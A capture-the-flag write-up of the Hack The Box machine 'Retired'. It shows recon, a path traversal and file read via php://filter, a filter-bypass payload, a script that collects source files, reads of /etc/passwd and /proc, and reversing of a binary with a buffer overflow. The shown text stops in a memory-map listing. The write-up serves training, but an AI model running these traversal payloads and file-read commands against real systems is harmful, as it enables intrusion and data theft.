+++
title = "Retired From Hack The Box - Medium Machine"
date = 2022-05-12T16:05:10+01:00
draft = false
type = "post"
excerpt = """
Upon initial analysis, it was discovered that the system in question was vulnerable to a file read and directory traversal exploit. Subsequently, it was also identified that an additional exploit, a File read vulnerability, existed. This allowed for the acquisition of a binary file through the website's file upload feature. Further examination revealed that the binary was susceptible to a buffer overflow exploit, which could be leveraged by utilizing the aforementioned file upload vulnerability. By utilizing Return-Oriented Programming (ROP), the stack was made executable, allowing for the execution of reverse shell shellcode. This resulted in the acquisition of a shell, which was then utilized to introduce a symbolic link within a backup directory, leading to the retrieval of an SSH key. To attain root access, the system's "binfmt_misc" function was abused.
"""
authors = ["Hassan AL ACHEK"]
tags = ["HTB", "CTF", "Linux", "Hacking"]
categories = []
readingTime = 5  
hero = "/images/default.jpg"
+++


# Recon:

## Nmap Scan:

### Quick Nmap Scan:

- Open Ports: 80 (http) - 22 (ssh)

```bash
~
❯ nmap 10.10.11.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:25 CET
Nmap scan report for 10.10.11.154
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.74 seconds
```

### Nmap Full Port Scan:

```bash
~
❯ nmap -p- 10.10.11.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:29 CET
Nmap scan report for 10.10.11.154
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 58.07 seconds
```

### Nmap Services Version Fingerprinting:

```bash
~
❯ nmap -p80,22 -sV -sC 10.10.11.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 23:34 CET
Nmap scan report for 10.10.11.154
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds
```

### Recon: Web Application - Port: 80 (http)

- **Main Page**:
  ![Image alt](/images/Pasted-image-20221207233632.png)

- Web Tech Stack:
  ![Image alt](/images/Pasted-image-20221207233725.png)

- Using wappalyzer firefox extension we can get intial idea about the web tech stack used:
  - Back-end programming language: PHP
  - Server: Nginx
- **Contact Us**: - The form seems to not be submitted to the backend server:
  ![Image alt](/images/Pasted-image-20221207234040.png)

- Our Services:
  ![Image alt](/images/Pasted-image-20221207234251.png)

**EMUEMU**: Coming soon: The official software emulator for OSTRICH roms. We want to encourage a vibrant community and have made it our goal to provide an easily hackable software-only way to get started with the OSTRICH platform. This emulator should satisfy all you customization and development needs. (This is currently **only open for _beta_ testers** who already purchased an OSTRICH)

- HTTP Get Parameter:
  - From the URL, We can detect a GET parameter submitted to the backend server: http://10.10.11.154/index.php?page=default.html
  - The GET parameter _page_.
  - The current value of the _page_ query parameter is _default.html_
  - Based on the parameter name and value, we can conclude that the variable is used to load the main page website (_default.html_).
  - The web applciaton load the page specified by the page parameter's value.
  - We can test if the parameter is vulnerable to path traversal or if we can reveal a secret page.

#### Revealing the _beta.html_ page:

- This phrase catched my eyes: This is currently **only open for _beta_ testers** who already purchased an OSTRICH
- **For beta testers**: So i decided to tries beta.php or beta.html

![Image alt](/images/Pasted-image-20221207235719.png)

- _beta.html_: revealed a new page with file upload functionality (New attack vector)
 

Currently development for EMUEMU just started, but we have big plans. If you bought an OSTRICH console from us and want want to be part of the next step, you can enable your OSTRICH license for usage with EMUEMU via the activate_license application today for our upcoming beta testing program for EMUEMU. A license files contains a 512 bit key. That key is also in the QR code contained within the OSTRICH package. Thank you for participating in our beta testing program.

Upload License Key File

- If we submit any file, it will be submitted to `activate_license.php`

![Image alt](/images/Pasted-image-20221208000157.png)

you can enable your OSTRICH license for usage with EMUEMU via the **activate_license** application today for our upcoming beta testing program for EMUEMU.\_

![Image alt](/images/Pasted-image-20221208000400.png)

### Getting FootHold:

- Attack Vector:

  - http://10.10.11.154/index.php?page=default.html
  - _page_ query parameter used to load web application content
  - We can test if test parameter is vulnerable to path traversal and file inclusion vulnerability.

- Path traversal (According to chatGPT ;) )

```md
A path traversal vulnerability is a type of vulnerability that occurs when a program constructs a file path using user-supplied input without properly sanitizing it. This can allow an attacker to access files outside of the intended directory by providing a file path that traverses outside of the directory. For example, if a program expects a file name as input and constructs a file path using the following code:

Copy code

`char filepath[100]; sprintf(filepath, "/var/www/files/%s", filename);`

An attacker could provide the file name "../../etc/passwd" as input, which would result in the file path "/var/www/files/../../etc/passwd". This file path traverses outside of the `/var/www/files` directory and accesses the `/etc/passwd` file, which contains the system's user accounts.

To prevent path traversal vulnerabilities, it is important to properly sanitize user-supplied input before using it to construct file paths. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:

Copy code

`if (!is_alphanumeric(filename)) {   error("invalid file name"); } char filepath[100]; sprintf(filepath, "/var/www/files/%s", filename);`

This prevents an attacker from providing malicious input that can be used to traverse outside of the intended directory.
```

- File inclusion (According to chatGPT ;) )

```md
A file inclusion vulnerability is a type of vulnerability that occurs when a program includes a file using user-supplied input without properly sanitizing it. This can allow an attacker to include arbitrary files on the server, potentially exposing sensitive information or allowing the attacker to execute arbitrary code.

For example, consider a PHP script that uses the following code to include a file specified by the `$page` variable:

Copy code

`include($page);`

If an attacker can control the value of the `$page` variable, they could provide a file path that includes a sensitive file on the server, such as the server's password file. For example, the attacker could provide the following value for `$page`:

Copy code

`/etc/passwd`

This would cause the PHP script to include the `/etc/passwd` file, exposing the server's user accounts to the attacker.

To prevent file inclusion vulnerabilities, it is important to properly sanitize user-supplied input before using it to include files. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:

Copy code

`if (!is_alphanumeric($page)) {   error("invalid file name"); } include($page);`

This prevents an attacker from providing malicious input that can be used to include arbitrary files on the server.
```

- Using this simple php filter trick, i was able to get the content of /etc/passwd file:

```bash
~
❯ curl http://10.10.11.154/index.php?page=php://filter/resource=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

- Now I will create a simple bash script to automate the process of collecting _default.html, beta.html, activate_license.php, index.php_ source code

```bash
~
❯ cat collectSourceCode.sh
#!/bin/bash

# Check If Argument Available
if [ -z $1 ]; then
        echo "[-] Usage: $0 <Remote_IP>"
        exit
fi


# Mahcine IP Address
IP=$1

# Check If Loot directory Already Exist
if [ -d loot ]; then
        echo "[+] Loot Directory Already Exists"
else
        mkdir loot
        echo "[+] Loot Directory Created"
fi

echo "[+] Loot Files Will Be Saved To: " $(pwd)/loot

files=("default.html" "beta.html" "activate_license.php" "index.php")

for f in ${files[@]};do
        echo "[+] Downloading: $f"
        curl "http://$IP/index.php?page=php://filter/resource=$f" -o loot/$f
done

echo "[~] Done, Bye :)"
```

```bash
~
❯ ./collectSourceCode.sh 10.10.11.154
[+] Loot Directory Created
[+] Loot Files Will Be Saved To:  /home/xh41/loot
[+] Downloading: default.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11414    0 11414    0     0  84040      0 --:--:-- --:--:-- --:--:-- 84548
[+] Downloading: beta.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4144    0  4144    0     0  44852      0 --:--:-- --:--:-- --:--:-- 45043
[+] Downloading: activate_license.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   585    0   585    0     0   3061      0 --:--:-- --:--:-- --:--:--  3078
[+] Downloading: index.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   348    0   348    0     0   1814      0 --:--:-- --:--:-- --:--:--  1821
[~] Done, Bye :)
```

```bash
# Files Downloaded
~
❯ tree loot
loot
├── activate_license.php
├── beta.html
├── default.html
└── index.php

0 directories, 4 files
```

- _Note:_ the vulnerability we exploited is not a file inclusion vulnerability, it's a file read vuln `readfile`

#### Collected Files Analysis:

- _index.php_:

```php
// index.php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

- By analysing _index.php_, i discoved that i bypassed the filter by incident :)
- sanitize_input($param) analysis: this function replace ./ and ../ with empty string. the following payload will bypasss this filter: `.....///.....///.....///.....///.....///etc/passwd`

```bash
php > $param = '.....///.....///.....///.....///.....///etc/passwd';
php > $param1 = str_replace("../","",$param);
php > $param2 = str_replace("./","",$param1);
php > echo $param2;
../../../../../etc/passwd
```

- The payload is not complete till now. We need to bypass this regex: `preg_match("/^[a-z]/", $page)`, this regex insists that the first chracter of the `$page` need to be a charcter from [a-z].
- Final Payload: `a.....///.....///.....///.....///.....///etc/passwd`

- _activate_license.php_:

```php
# activate_license.php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

- By analyzing the _activate_license.php_ code. We can conclude that the submited file will be sent to a local process listning on port `1337`

```php
# socket object created
socket_connect($socket, '127.0.0.1', 1337)

# send the file size
socket_write($socket, pack("N", $license_size));

# send the file content
socket_write($socket, $license);
```

- To get the process listning on port `1337`. We wil use a simple trick: we will request the following special file on linux: `/proc/sched_debug`
- `/proc/sched_debug` : This special file contains a list of process running on the system

```bash
~
❯ curl http://10.10.11.154/index.php\?page\=php://filter/resource\=/proc/sched_debug
Sched Debug Version: v0.11, 5.10.0-11-amd64 #1

......

runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------

........

S activate_licens   411     15071.602333         9   120         0.000000         1.852602         0.000000 0 0 /
 S            cron   412     35611.351366       276   120         0.000000        52.059113         0.000000 0 0 /
 S        rsyslogd   418     35157.743823        51   120         0.000000         3.971595         0.000000 0 0 /
 S       in:imklog   427     33342.408519        11   120         0.000000         1.892979         0.000000 0 0 /
 S   rs:main Q:Reg   429     35611.332270      3333   120         0.000000        92.945178         0.000000 0 0 /
 S          hwmon1   508      3588.766100         2   120         0.000000         0.018254         0.000000 0 0 /
 S          agetty   577      8758.342870         9   120         0.000000         4.459420         0.000000 0 0 /
 S            sshd   579     11203.112158        44   120         0.000000        18.451294         0.000000 0 0 /
 S           nginx   581     35622.723457       211   120         0.000000        38.343570         0.000000 0 0 /
 S           nginx   582     31556.512427        15   120         0.000000         3.710789         0.000000 0 0 /
 S      php-fpm7.4   583     35342.638077        59   120         0.000000        12.122552         0.000000 0 0 /

........

```

```bash
# From this process name it's clear that this is the process used for activate license
 S activate_licens   411     15071.602333         9   120         0.000000         1.852602         0.000000 0 0 /
```

- We will download the process binary and command line arguments using the following files [reference](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html):
  - `/proc/411/cmdline`: Command line arguments.
  - `/proc/411/exe`: Link to the executable of this process.

```bash
~
❯ curl "http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/cmdline" -o cmdline_activate
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    31    0    31    0     0    187      0 --:--:-- --:--:-- --:--:--   189

~
❯ curl "http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/exe" -o activate_licens
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 22536    0 22536    0     0  96500      0 --:--:-- --:--:-- --:--:-- 96721

~
❯ ls -alh activate_licens cmdline_activate
-rw-r--r-- 1 xh41 xh41 23K Dec  8 01:26 activate_licens
-rw-r--r-- 1 xh41 xh41  31 Dec  8 01:26 cmdline_activate
```

```bash
~
❯ cat cmdline_activate
/usr/bin/activate_license 1337 # the port used by
```

```bash
~
❯ file activate_licens
activate_licens: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped

```

#### Start the fun: reversing `activate_licens` binary file

- Fire up ghidra or IDA: and let's go:
- Main function: Pseudo-code

```C
# main function
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int *v3; // rax
  char *v4; // rax
  int *v5; // rax
  char *v6; // rax
  int *v7; // rax
  char *v8; // rax
  int *v9; // rax
  char *v10; // rax
  char clientaddr_s[16]; // [rsp+10h] [rbp-50h] BYREF
  sockaddr_in clientaddr; // [rsp+20h] [rbp-40h] BYREF
  socklen_t clientaddrlen; // [rsp+3Ch] [rbp-24h] BYREF
  sockaddr_in server; // [rsp+40h] [rbp-20h] BYREF
  uint16_t port; // [rsp+56h] [rbp-Ah] BYREF
  int clientfd; // [rsp+58h] [rbp-8h]
  int serverfd; // [rsp+5Ch] [rbp-4h]

  if ( argc != 2 )
    error("specify port to bind to");
  if ( (unsigned int)__isoc99_sscanf(argv[1], "%hu", &port) == -1 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    error(v4);
  }
  printf("[+] starting server listening on port %d\n", port);
  server.sin_family = 2;
  server.sin_addr.s_addr = htonl(0x7F000001u);
  server.sin_port = htons(port);
  serverfd = socket(2, 1, 6);
  if ( serverfd == -1 )
  {
    v5 = __errno_location();
    v6 = strerror(*v5);
    error(v6);
  }
  if ( bind(serverfd, (const struct sockaddr *)&server, 0x10u) == -1 )
  {
    v7 = __errno_location();
    v8 = strerror(*v7);
    error(v8);
  }
  if ( listen(serverfd, 100) == -1 )
  {
    v9 = __errno_location();
    v10 = strerror(*v9);
    error(v10);
  }
  puts("[+] listening ...");
  while ( 1 )
  {
    while ( 1 )
    {
      clientfd = accept(serverfd, (struct sockaddr *)&clientaddr, &clientaddrlen);
      if ( clientfd != -1 )
        break;
      fwrite("Error: accepting client\n", 1uLL, 0x18uLL, stderr);
    }
    inet_ntop(2, &clientaddr.sin_addr, clientaddr_s, 0x10u);
    printf("[+] accepted client connection from %s:%d\n", clientaddr_s, clientaddr.sin_port);
    if ( !fork() )
    {
      close(serverfd);
      activate_license(clientfd);
      exit(0);
    }
    __sysv_signal(17, (__sighandler_t)((char *)&dword_0 + 1));
    close(clientfd);
  }
}
```

- chatGPT Explanation: (Very accurate :P)

```md
This code is a simple implementation of a server that listens for incoming client connections on a specified port, accepts them, and then passes the client connection to a function called `activate_license`. The server uses the `inet_ntop` and `fork` functions to handle multiple client connections concurrently.

`__cdecl` and `__noreturn` are calling conventions and function attributes. `__cdecl` is the standard calling convention for C programs, which specifies the calling and return behavior of functions in the program. `__noreturn` is a function attribute that indicates that the function does not return. In this case, the `main` function is marked with both attributes, indicating that it is a standard C function that does not return.

The `main` function takes three arguments: `argc`, `argv`, and `envp`. `argc` is the number of arguments passed to the program, and `argv` is an array of strings containing the actual arguments. `envp` is an array of strings containing the environment variables of the program.

Inside the `main` function, the code first checks if the number of arguments passed to the program (`argc`) is equal to 2. If not, it calls the `error` function with the string "specify port to bind to". This means that the program expects the user to specify a port number as an argument when running the program.

Next, the code uses `__isoc99_sscanf` to parse the first argument (the port number) and store it in the `port` variable. If an error occurs, the code gets the error code using `__errno_location` and then calls the `error` function with a string containing a description of the error.

The code then prints a message indicating that the server is starting and listening on the specified port. It creates a `serverfd` socket using the `socket` function, and then uses the `bind` and `listen` functions to bind the socket to the specified port and listen for incoming connections.

Next, the code enters an infinite loop to continuously accept incoming client connections. For each incoming connection, the code calls the `accept` function to accept the connection and store the client information in the `clientaddr` structure. It then calls the `inet_ntop` function to convert the client's IP address to a human-readable string and print it, along with the client's port number.

The code then creates a child process using the `fork` function to handle the client connection concurrently with other connections. In the child process, the code calls the `activate_license` function with the client's socket file descriptor, `clientfd`, and then exits. In the parent process, the code closes the client's socket file descriptor and continues to accept incoming connections.
```

- _activate_license_ function analysis:

```c
void __fastcall activate_license(int sockfd)
{
  int *v1; // rax
  char *v2; // rax
  int *v3; // rax
  char *v4; // rax
  const char *v5; // rax
  const char *v6; // rax
  const char *v7; // rax
  const char *v8; // rax
  const char *v9; // rax
  const char *v10; // rax
  const char *v11; // rax
  const char *v12; // rax
  sqlite3_stmt_0 *stmt; // [rsp+18h] [rbp-218h] BYREF
  sqlite3_0 *db; // [rsp+20h] [rbp-210h] BYREF
  uint32_t msglen; // [rsp+2Ch] [rbp-204h] BYREF
  char buffer[512]; // [rsp+30h] [rbp-200h] BYREF

  if ( read(sockfd, &msglen, 4uLL) == -1 )
  {
    v1 = __errno_location();
    v2 = strerror(*v1);
    error(v2);
  }
  msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n", msglen);
  if ( read(sockfd, buffer, msglen) == -1 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    error(v4);
  }
  if ( (unsigned int)sqlite3_open("license.sqlite", &db) )
  {
    v5 = (const char *)sqlite3_errmsg(db);
    error(v5);
  }
  sqlite3_busy_timeout(db, 2000LL);
  if ( (unsigned int)sqlite3_exec(
                       db,
                       "CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,   license_key TEXT)",
                       0LL,
                       0LL,
                       0LL) )
  {
    v6 = (const char *)sqlite3_errmsg(db);
    error(v6);
  }
  if ( (unsigned int)sqlite3_prepare_v2(db, "INSERT INTO license (license_key) VALUES (?)", 0xFFFFFFFFLL, &stmt, 0LL) )
  {
    v7 = (const char *)sqlite3_errmsg(db);
    error(v7);
  }
  if ( (unsigned int)sqlite3_bind_text(stmt, 1LL, buffer, 512LL, 0LL) )
  {
    v8 = (const char *)sqlite3_errmsg(db);
    error(v8);
  }
  if ( (unsigned int)sqlite3_step(stmt) != 101 )
  {
    v9 = (const char *)sqlite3_errmsg(db);
    error(v9);
  }
  if ( (unsigned int)sqlite3_reset(stmt) )
  {
    v10 = (const char *)sqlite3_errmsg(db);
    error(v10);
  }
  if ( (unsigned int)sqlite3_finalize(stmt) )
  {
    v11 = (const char *)sqlite3_errmsg(db);
    error(v11);
  }
  if ( (unsigned int)sqlite3_close(db) )
  {
    v12 = (const char *)sqlite3_errmsg(db);
    error(v12);
  }
  printf("[+] activated license: %s\n", buffer);
}
```

- chatGPT Explanation: (Very accurate :P)
  - When chatGPT talks, i don't have anything to add :) .

```md
The `activate_license` function is a function that is called with a socket file descriptor, `sockfd`, when a new client connection is accepted by the server. The function reads a message of a specified length from the client using the `read` function, and then stores the message in a buffer. It then uses the `sqlite3` library to create and open a SQLite database file called "license.sqlite" if it does not already exist, and creates a table called "license" in the database if it does not already exist.

The function then prepares an SQL statement to insert the license key contained in the buffer into the "license" table, binds the license key to the statement, and then executes the statement. If any errors occur during these steps, the code calls the `error` function with a description of the error.

Finally, the function prints a message indicating that the license has been activated, and then returns.
```

#### Stack smashing: Exploiting buffer overflow vulnerability

- **ChatGPT** explanation for buffer overflow:

A buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer than the buffer is allocated to hold. This can happen, for example, when a program uses a fixed-length buffer to store user input, but the user provides more input than the buffer can hold. When this occurs, the extra data can overwrite adjacent memory, potentially corrupting or overwriting important data structures used by the program. In some cases, this can allow an attacker to execute arbitrary code by providing carefully crafted input that overwrites the program's execution flow.

- Thanks chatGPT :\*

##### The vulnerability root cause (it's the time to say good buy to chatGPT):

- After reading this code snippet from `activate_license` function

```c
// code snippet - 1
....
 if ( read(sockfd, &msglen, 4uLL) == -1 )
....
```

- After reciving a successful connection (the program listning at 127.0.0.1:1337), `activate_license` function read the message len (`msglen` variable) from the socket file descriptor (`sockfd`) (take user input and put it into a variable - INPUT-1)
- Based on the `msglen` variable the following code snippet read into the buffer variable data receivaed from the socket file descriptor (`sockfd`) (another user input - INPUT-2)

```c
// code snippet - 2
.....
  msglen = ntohl(msglen); // The ntohl() function converts the unsigned integer netlong from network byte order to host byte order.
  printf("[+] reading %d bytes\n", msglen);
  if ( read(sockfd, buffer, msglen) == -1 )
.....
```

- The problem here is that the function used to read the data from `sockfd` and put it into the `buffer` variable is insecure (`read` from c standard library) . There is no boundary validation and the buffer (`char buffer[512];`) size is limited to (512 x 1 byte (char size in C language) = 512 byte), the user can enter too much data and overflow the `buffer` variable.

- `read` function manual page:

```bash
# man 2 read
READ(2)                                              Linux Programmer's Manual                                             READ(2)

NAME
       read - read from a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);

DESCRIPTION
       read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
```

- ChatGPT opinion:
  ![Image alt](/images/Pasted-image-20221208165806.png)

- Actually the probem here is not with the read function itslef. It's with reading the message len from the user input and then attempt to read `msglen` from the user input into a limited size `buffer` variable.

![Image alt](/images/buffer-1.png)

- So now if i enter the `msglen` as `520 bytes` the program will attempt to read 520 bytes from the `sockfd` into a 512 bytes `buffer` variable. Overflow!!!

![Image alt](/images/buffer-2.png)

- The most important question how to communicate wirh a process litning at localhost?
  - Do you miss me?

```php
# activate_license.php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

- All what we need to do is to create a crafted licensefile and submit it via the file upload functionality.
- The cradted file will exploit the vulnerability and give us access to the remote machine.
- **Note**:
I thinked about exploiting SQL injection vuln but the application prepare query fucntion which means that the program is safe against SQL injection vuln.

```c
if ( (unsigned int)sqlite3_prepare_v2(db, "INSERT INTO license (license_key) VALUES (?)", 0xFFFFFFFFLL, &stmt, 0LL) )
```

#### Debugging and Binary exploitaion:

##### Checking the security flags applied to the binary file:

```bash
~
❯ checksec --file activate_license
[*] '/home/xh41/HTBMachines/Retired_Box/activate_licens'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- What is nx protection? (ChatGPT)

```md
NX protection, also known as "non-executable memory", is a security feature that prevents the execution of code from certain memory regions, such as the stack and the heap. This can help to protect against certain types of exploits, such as buffer overflows, that attempt to execute arbitrary code by writing it to these memory regions and then executing it.

NX protection is often used with binary files, such as executables and shared libraries, to prevent attackers from executing code that has been written to these memory regions. This can provide an additional layer of security for the program, making it more difficult for attackers to exploit vulnerabilities in the program.
```

- What is PIE protection? (ChatGPT)

```md
PIE, which stands for "position-independent executable", is a protection used with binary files to make them resistant to memory-related exploits. When a binary file is compiled as a PIE, the compiler generates code that can be loaded at any memory address without breaking the program. This means that an attacker cannot predict the memory layout of the program, and therefore cannot easily exploit vulnerabilities such as buffer overflows.

PIE protection is often used in conjunction with other security features, such as NX protection, to provide additional security for binary files. It is particularly useful for programs that are likely to be targeted by attackers, such as servers and other critical applications.
```

- Address randomization protection enabled (ASLR) into the remte machine

```bash
~
❯ curl "http://10.10.11.154/index.php?page=php://filter/resource=/proc/sys/kernel/randomize_va_space"
2 # means full address layout randomization
```

- Thanks ChatGPT :).

- Too many protection!!! difficult to exploit!!!
  - NX enabled: bypass return to libc (ret2libc)
  - PIE enabled: leak one memory address
  - ASLR we have access to the machine files so we can get the memory maps of the `activate_licens` binary file (_Everyting on linux is a file_)
- Hola!, Do you remember me?

```bash
~
❯ curl "http://10.10.11.154/index.php?page=php://filter/resource=<FileToRead>"

~
❯ curl http://10.10.11.154/index.php?page=php://filter/resource=/proc/sched_debug --output sched_debug

~
❯ grep activate sched_debug # proces id 401
 S activate_licens   401      2992.578475         8   120         0.000000         3.256014         0.000000 0 0 /
```

- Get the running process memory layout from maps file:

```bash
~
❯ curl "http://10.10.11.154/index.php?page=/proc/401/maps"
55ab7331f000-55ab73320000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55ab73320000-55ab73321000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55ab73321000-55ab73322000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55ab73322000-55ab73323000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55ab73323000-55ab73324000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55ab73e0e000-55ab73e2f000 rw-p 00000000 00:00 0                          [heap]
7f4b238d3000-7f4b238d5000 rw-p 00000000 00:00 0
7f4b238d5000-7f4b238d6000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f4b238d6000-7f4b238d8000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f4b238d8000-7f4b238d9000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f4b238d9000-7f4b238da000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f4b238da000-7f4b238db000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f4b238db000-7f4b238e2000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f4b238e2000-7f4b238f2000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f4b238f2000-7f4b238f7000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f4b238f7000-7f4b238f8000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f4b238f8000-7f4b238f9000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f4b238f9000-7f4b238fd000 rw-p 00000000 00:00 0
7f4b238fd000-7f4b2390c000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4b2390c000-7f4b239a6000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4b239a6000-7f4b23a3f000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4b23a3f000-7f4b23a40000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4b23a40000-7f4b23a41000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4b23a41000-7f4b23a66000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
